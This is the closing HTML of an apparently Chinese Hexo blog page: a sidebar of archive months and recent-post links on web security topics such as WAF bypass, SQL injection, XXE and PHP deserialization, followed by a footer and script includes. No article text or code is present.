</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">WAF-安全狗绕过文件上传</a>
          </li>
        
          <li>
            <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
          </li>
        
          <li>
            <a href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">XXE漏洞-利用检测绕过</a>
          </li>
        
          <li>
            <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
          </li>
        
          <li>
            <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>